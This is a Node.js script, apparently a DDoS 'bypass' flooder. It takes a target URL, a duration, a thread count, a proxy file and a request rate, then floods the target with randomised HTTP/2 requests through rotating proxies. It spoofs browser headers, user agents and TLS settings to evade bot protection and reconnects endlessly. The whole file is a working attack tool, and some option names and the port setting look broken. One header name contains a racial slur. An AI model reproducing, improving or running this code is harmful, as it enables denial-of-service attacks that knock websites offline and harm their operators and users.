const url = require('url'),
  fs = require('fs'),
  http2 = require('http2'),
  http = require('http'),
  tls = require('tls'),
  cluster = require('cluster')
const crypto = require('crypto');
const os = require("os");
const v8 = require('v8')
const errorHandler = error => {
 //console.log(error);
};
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);

try {
  var colors = require('colors');
} catch (err) {
  console.log('\x1b[36mInstalling\x1b[37m the requirements');
  execSync('npm install colors');
  console.log('Done.');
  process.exit();
}
cplist = ['TLS_AES_128_GCM_SHA256',          // TLS 1.3
  'TLS_AES_256_GCM_SHA384',          // TLS 1.3
  'TLS_CHACHA20_POLY1305_SHA256',    // TLS 1.3
  'TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256',  // TLS 1.2
  'TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256',    // TLS 1.2
  'TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384',  // TLS 1.2
  'TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384',    // TLS 1.2
  'TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256', // TLS 1.2
  'TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256',   // TLS 1.2
  'TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA',       // TLS 1.2
  'TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA',       // TLS 1.2
  'TLS_RSA_WITH_AES_128_GCM_SHA256',          // TLS 1.2
  'TLS_RSA_WITH_AES_256_GCM_SHA384',          // TLS 1.2
  'TLS_RSA_WITH_AES_128_CBC_SHA',             // TLS 1.2
  'TLS_RSA_WITH_AES_256_CBC_SHA'  ]
controle_header = ['no-cache', 'no-store', 'no-transform', 'only-if-cached', 'max-age=0', 'must-revalidate', 'public', 'private', 'proxy-revalidate', 's-maxage=86400'], ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'], ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
const headerFunc = {
  cipher() {
    return cplist[Math.floor(Math.random() * cplist.length)];
  },
}
process.on('uncaughtException', function(e) {
  if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
  if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
  if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);
const target = process.argv[2];
const time = process.argv[3];
const thread = process.argv[4];
const proxyFile = process.argv[5];
const rps = process.argv[6];
let input = 'bypass';
// Validate input
if (!target || !time || !thread || !proxyFile || !rps || !input) {
  console.log('DIKAY BYPASS'.bgRed)
  console.error(`Example: node bypass url time thread proxy.txt rate bypass query(true/false)`.rainbow);
  console.log('default : query : true'.red);
  process.exit(1);
}
// Validate target format
if (!/^https?:\/\//i.test(target)) {
  console.error('sent with http:// or https://');
  process.exit(1);
}
// Parse proxy list
let proxys = [];
try {
  const proxyData = fs.readFileSync(proxyFile, 'utf-8');
  proxys = proxyData.match(/\S+/g);
} catch (err) {
  console.error('Error proxy file:', err.message);
  process.exit(1);
}
// Validate RPS value
if (isNaN(rps) || rps <= 0) {
  console.error('number rps');
  process.exit(1);
}
const proxyr = () => {
  return proxys[Math.floor(Math.random() * proxys.length)];
}
function randx(length) {
  const characters = ":-(";
  let result = "";
  const charactersLength = characters.length;
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}

function shuffleObject(obj) {
  const keys = Object.keys(obj);
  const shuffledKeys = keys.reduce((acc, _, index, array) => {
    const randomIndex = Math.floor(Math.random() * (index + 1));
    acc[index] = acc[randomIndex];
    acc[randomIndex] = keys[index];
    return acc;
  }, []);
  const shuffledObject = Object.fromEntries(shuffledKeys.map((key) => [key, obj[key]]));
  return shuffledObject;
}
function generateRandomString(minLength, maxLength) {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
  const randomStringArray = Array.from({
    length
  }, () => {
    const randomIndex = Math.floor(Math.random() * characters.length);
    return characters[randomIndex];
  });
  return randomStringArray.join('');
}
function eko(minLength, maxLength) {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
  const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
  const randomStringArray = Array.from({
    length
  }, () => {
    const randomIndex = Math.floor(Math.random() * characters.length);
    return characters[randomIndex];
  });
  return randomStringArray.join('');
}

function randnum(minLength, maxLength) {
  const characters = '0123456789';
  const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
  const randomStringArray = Array.from({
    length
  }, () => {
    const randomIndex = Math.floor(Math.random() * characters.length);
    return characters[randomIndex];
  });
  return randomStringArray.join('');
}

function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
function addRandomValuesToObject(obj) {
  const newObj = {};
  Object.keys(obj).forEach(key => {
    const randomKeySuffix = eko(1,2);
    const randomValueSuffix = eko(1,2);
    const newKey = key + randomKeySuffix;
    const newValue = obj[key] + randomValueSuffix;
    newObj[newKey] = newValue;
  });
  return newObj;
}

const MAX_RAM_PERCENTAGE = 90;
const RESTART_DELAY = 100;
let postData
let post
if (cluster.isMaster) {
  console.clear()
  console.log('HEAP SIZE:',v8.getHeapStatistics().heap_size_limit/(1024*1024))
  console.log(`@dikay`.bgRed), console.log(`[!] low requests`)
  process.stdout.write("Loading: 10%\n");
  setTimeout(() => {
    process.stdout.write("\rLoading: 50%\n");
  }, 500 * time);
  setTimeout(() => {
    process.stdout.write("\rLoading: 100%\n");
  }, time * 1000);
  const restartScript = () => {
    for (const id in cluster.workers) {
      cluster.workers[id].kill();
    }
    console.log('[>] Restarting ', RESTART_DELAY, 'ms...');
    setTimeout(() => {
      for (let counter = 1; counter <= thread; counter++) {
        cluster.fork();
      }
    }, RESTART_DELAY);
  };
  const handleRAMUsage = () => {
    const totalRAM = os.totalmem();
    const usedRAM = totalRAM - os.freemem();
    const ramPercentage = (usedRAM / totalRAM) * 100;
    if (ramPercentage >= MAX_RAM_PERCENTAGE) {
      console.log('[!] Maximum RAM ', ramPercentage.toFixed(2), '%');
      restartScript();
    }
  };
  const argsa = process.argv.slice(7);
  const queryIndexa = argsa.indexOf('--post');
  post = queryIndexa !== -1 ? argsa[queryIndexa + 1] : null;
  if (post === 'true') {
    argsq = process.argv.slice(7);
    const dataIndex = argsq.indexOf('--data');
    postData = dataIndex !== -1 ? argsq[dataIndex + 1] : null;
    if (postData === null || postData.trim() === '') {
      console.log("Require post data");
      process.exit();
    } else {
      // console.log('POST MODE');
    }
  } else {
    console.log('GET MODE');
  }
  setInterval(handleRAMUsage, 1000);
  for (let i = 0; i < thread; i++) {
    cluster.fork();
  }
  setTimeout(() => process.exit(-1), time * 1000);
} else {
  if (input === 'bypass') {
    const abu = setInterval(function() {
      flood()
    }, 1);
  } else {
    setInterval(flood)
  }
}
async function flood() {
  var parsed = url.parse(target);
  var proxy = proxyr().split(':');
  let interval
  if (input === 'flood') {
    interval = 1000;
  } else if (input === 'bypass') {
    function randomDelay(min, max) {
      return Math.floor(Math.random() * (max - min + 1)) + min;
    }
    interval = randomDelay(500, 1000);
  } else {
    interval = 1000;
  }
  nodeii = getRandomInt(109,124)
pervalue = [
  `\\\"Brave\\\";v=\\\"${nodeii}\\\", \\\"Not`+(Math.random() <0.5 ? randx(1):" ")+`A`+(Math.random() <0.5 ? randx(1):" ")+`Brand\\\";v=\\\"8\\\", \\\"Chromium\\\";v=\\\"${nodeii}\\`,
  `\\\"Not`+(Math.random() <0.5 ? randx(1):" ")+`A`+(Math.random() <0.5 ? randx(1):" ")+`Brand\\\";v=\\\"8\\\", \\\"Chromium\\\";v=\\\"${nodeii}\\\", \\\"Google Chrome\\\";v=\\\"${nodeii}\\`,
  `\\\"Not`+(Math.random() <0.5 ? randx(1):" ")+`A`+(Math.random() <0.5 ? randx(1):" ")+`Brand\\\";v=\\\"8\\\", \\\"Chromium\\\";v=\\\"${nodeii}\\\", \\\"Brave\\\";v=\\\"${nodeii}\\`,
  `\\\"Not`+(Math.random() <0.5 ? randx(1):" ")+`A`+(Math.random() <0.5 ? randx(1):" ")+ `Brand\\\";v=\\\"99\\\", \\\"Brave\\\";v=\\\"${nodeii}\\\", \\\"Chromium\\\";v=\\\"${nodeii}\\`,
  `\\\"Google Chrome\\\";v=\\\"${nodeii}\\\", \\\"Not`+(Math.random() <0.5 ? randx(1):" ")+`A`+(Math.random() <0.5 ? randx(1):" ")+`Brand\\\";v=\\\"8\\\", \\\"Chromium\\\";v=\\\"${nodeii}\\`,
  `\\\"Chromium\\\";v=\\\"${nodeii}\\\", \\\"Not`+(Math.random() <0.5 ? randx(1):" ")+`A`+(Math.random() <0.5 ? randx(1):" ")+`Brand\\\";v=\\\"24\\\", \\\"Brave\\\";v=\\\"${nodeii}\\`,
  `\\"Chromium\\\";v=\\\"${nodeii}\\\", \\\"Not`+(Math.random() <0.5 ? randx(1):" ")+`A`+(Math.random() <0.5 ? randx(1):" ")+`Brand\\\";v=\\\"24\\\", \\\"Google Chrome\\\";v=\\\"${nodeii}\\`,
  ]


  var browsers = ["Chrome/122.0.0.0 Safari/537.36", "Chrome/121.0.0.0 Safari/537.36", "Chrome/120.0.0.0 Safari/537.36", "Chrome/119.0.0.0 Safari/537.36" ];

  function getRandomValue(arr) {
    const randomIndex = Math.floor(Math.random() * arr.length);
    return arr[randomIndex];
  }
  const randomBrowser = getRandomValue(browsers);
  //console.log(uas)
  
  //random object
  const agent = await new http.Agent({
		host: proxy[0]
		, port: proxy[1]
		, keepAlive: false
		, keepAliveMsecs: 500000000
		, maxSockets: 50000
		, maxTotalSockets: 100000
	, });
  const Optionsreq = {
		agent: agent
		, method: 'CONNECT'
		, path: parsed.host + ':443'
		, timeout: 5000
		, headers: {
			'Host': parsed.host
			, 'Proxy-Connection': 'Keep-Alive'
			, 'Connection': 'close'
			, 'Proxy-Authorization': `Basic ${Buffer.from(`${proxy[2]}:${proxy[3]}`).toString('base64')}`
		, }
	, };
  connection = await http.request(Optionsreq, (res) => {});
  connection.on('error', (err) => {
    if (err) return
  });
  connection.on('timeout', async () => {
    return
  });
  const args = process.argv.slice(7);
  const queryIndex = args.indexOf('--query');
  const query = queryIndex !== -1 ? args[queryIndex + 1] : null;
  const argsa = process.argv.slice(7);
  const queryIndexa = argsa.indexOf('--post');
  post = queryIndexa !== -1 ? argsa[queryIndexa + 1] : null;
  const bypass = process.argv.slice(2);
  const bypassindex = bypass.indexOf('--randuser');
  const index = bypassindex !== -1 ? bypass[bypassindex + 1] : null;
  const max = index || 'false'
  let uas
 
  
  if (max !=='true'){
  uas = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkit/537.36 (KHTML, like Gecko) Chrome/${nodeii}.0.0.0 Safari/537.36`
}else{
  uas = generateRandomString(5, 7) + `Mozilla/5.0 (Windows NT ${randnum(0,10)}.0; Win64; x64) AppleWebkit/537.36 (KHTML, like Gecko) Chrome/${nodeii}.0.0.0 Safari/537.36` + getRandomInt(100, 99999) + '.' + getRandomInt(100, 99999)
}
 const datalog= [
  {[eko(1,2)+'-x-fetch-site--sytnc'+eko(1,2)+'--'+eko(2,4)]: '-wp-context-'+eko(1,2)+'-'+eko(1,2)},
  {[eko(1,2)+'-x-fetch-mode--cdp'+eko(1,2)+'--'+eko(2,4)]: 'PK-'+eko(1,2)+'-'+eko(1,2)},
  {[eko(1,2)+'-x-fetch-user--ukn'+eko(1,2)+'--'+eko(2,4)]: '<atset>>'+eko(1,2)+'-'+eko(1,2)},
  {[eko(1,2)+'-x-fetch-dest--fo'+eko(1,2)+'--'+eko(2,4)]: '@ogani-'+eko(1,2)+'-'+eko(1,2)},
  {[eko(1,2)+'-accept-encoding--ufo'+eko(1,2)+'--'+eko(2,4)]: 'POOILER|POOI|'+eko(1,2)+'-'+eko(1,2)},
  {[eko(1,2)+'-accept-language--nigga'+eko(1,2)+'--'+eko(2,4)]: 'xpath-acc'+eko(1,2)+'-'+eko(1,2)},
  {[eko(1,2)+'-x-botnet-close--ca'+eko(1,2)+'--'+eko(2,4)]:"rendercaching"+eko(1,2)+'-'+eko(1,2)},
  {[eko(1,2)+'-x-session-floor--pp'+eko(1,2)+'--'+eko(2,4)]:'YY&'+eko(1,2)+'-'+eko(1,2)},
  {[eko(1,2)+'-x-forwarded-for-data--'+eko(1,2)+'--'+eko(2,4)]:'Underclass|'+eko(1,2)+'-'+eko(1,2)},
  {[eko(1,2)+'-cf-emty-log-'+eko(1,2)+'--'+eko(2,4)]:'legit-gojection'+eko(1,2)+'-'+eko(1,2)},
 ]
 

  
 const header = {
//	'sec-ch-ua':pervalue[Math.floor(Math.random() * pervalue.length)] ,
  ...(Math.random() < 0.4 ? {"x-real-ip":"0"}:{}),
  ...(Math.random() < 0.8 ? {'sec-ch-ua-mobile': '?0'}:{}),
  'sec-ch-ua-platform': '\\\\\\\\\\"Windows"\\\\\\',
 "user-agent": uas,
 ...(Math.random() < 0.5 ? { "x-pipo-sarta-purpose": "prefetch"} : {} ),
 ...(Math.random() < 0.9 ?{"upgrade-insecure-requests": "1"} : { }),


 "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
  
  
    

 
	"accept-language": "vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3",
  'sec-fetch-dest': 'document',
  ...(Math.random() < 0.2 ? {'accept-encoding': 'gzip, deflate, br'}:{}),
  ...(Math.random() < 0.3 ? datalog[Math.floor(Math.random() * datalog.length)]:{"xyz-nel-navigator":"null"}),
    ...(Math.random() < 0.3 ? datalog[Math.floor(Math.random() * datalog.length)]:{"xyz-connection-navigator":"type@wifi"}),
    ...(Math.random() < 0.3 ? datalog[Math.floor(Math.random() * datalog.length)]:{"navigator-dd-network":"unclass"}),
    ...(Math.random() < 0.5 ?{['xyz-rada-sys-'+ generateRandomString(1,9)]: generateRandomString(1,10) + '-' +  generateRandomString(1,12) + '=' +generateRandomString(1,12)} : {}),
	...(Math.random() < 0.5 ?{['sec-olm-physical-ooo-'+ generateRandomString(1,9)]: generateRandomString(1,10) + '-' +  generateRandomString(1,12) + '=' +generateRandomString(1,12)} : {}),
 ['spmbol-xx-purpose-'+ generateRandomString(1,9)]: generateRandomString(1,10) + '-' +  generateRandomString(1,12) + '=' +generateRandomString(1,12),
  
  
 }
 


  cipor = cplist.join(':')
  const TLSOPTION = {
      cipher: cipor,
      minVersion: 'TLSv1.2',

   
    ...(Math.random() < 0.5 ? {
      echdCurve: "X25519"
    } : {
      echdCurve: "secp256r1:X25519"
    }),
    sigalgs: "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512",
    secure: true,
    rejectUnauthorized: false,
    ALPNProtocols: ['h2',"http1/1"],
    
      secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom
    
  };
  async function createCustomTLSSocket(parsed, socket) {
    const tlsSocket = await tls.connect({
      ...TLSOPTION,
      host: parsed.host,
      port: 22,
      servername: parsed.host,
      socket: socket
    });
    return tlsSocket;
  }
  connection.on('connect', async function(res, socket) {
    const tlsSocket = await createCustomTLSSocket(parsed, socket);
    clasq = Math.random()<0.5 ? 12517377+65535: 15663105+65535
    const client = await http2.connect(parsed.href, {
    
      ...shuffleObject({
      createConnection: () => tlsSocket,
      unknownProtocolTimeout:100,
      maxReservedRemoteStreams:100,
      maxSessionMemory: 100,
      minVersion: 'TLSv1.2',
      //protocol: "https",
      settings: {
        
          headerTableSize: 6291456,
        enablePush: false,
        ...(Math.random() < 0.5 ? {
          maxConcurrentStreams: 6291456
        } : {}),

        
          initialWindowSize: 6291456,

        ...(Math.random() < 0.5 ? {
          maxFrameSize: 6291456
        } : {}),
         
          maxHeaderListSize: 6291456,
      },
      })
    }, (session) => {
   
    session.setLocalWindowSize(clasq);
  })
    //client.ping((err, duration, payload) => {})
    //client.goaway(1, http2.constants.NGHTTP2_HTTP_1_1_REQUIRED, Buffer.from('GO AWAY'));
    client.on("connect", async () => {
      
      setInterval(async () => {
        for (let i = 0; i < rps; i++) {
          author = {
            ...(post === 'true' ? {
              ":method": "POST"
            } : {
              ":method": 'GET'
            }),
            ...(post === 'true' ? {
              "content-length": "0"
            } : {}),
            ":authority": parsed.host + (Math.random() < 0.5 ? '.' : ''),
            ":scheme":generateRandomString(3, 5),
            ...(query === 'true' ? {
              ":path": parsed.path + generateRandomString(3,8),
            } : {
              ":path": parsed.path + generateRandomString(3,8),
            }),
            ...(Math.random() < 0.1 ?{'cookie' : ''}:{}),
            "referer": 'https://www.google.com/search?q='+parsed.host
          /// "x-auth-email":generateRandomString(5, 10)  +"@gmail."+ generateRandomString(0, 10) +".com"
          }
          head = header
          
         
            
          
          //console.log(datas)
          const request = await client.request({
            ...author,
            ...head,
            }, {
           exclusive: true,
           weight: 256,
						waitForTrailers: true,
						endStream: true
					})
            
            
            request.end("Client Hello (SNI=scheme-sg.tlsext.com)");
           
					 
        }
      }, interval);
      
      
      
    }); 
    client.on("close", () => {
      client.destroy();
      tlsSocket.destroy();
      socket.destroy();
      return flood()
    });
    
    client.on("error", async (error) => {
      if (error) {
        await client.destroy();
        await tlsSocket.destroy();
        await socket.destroy();
        return flood()
      }
    });
  });
  connection.end();
 
} //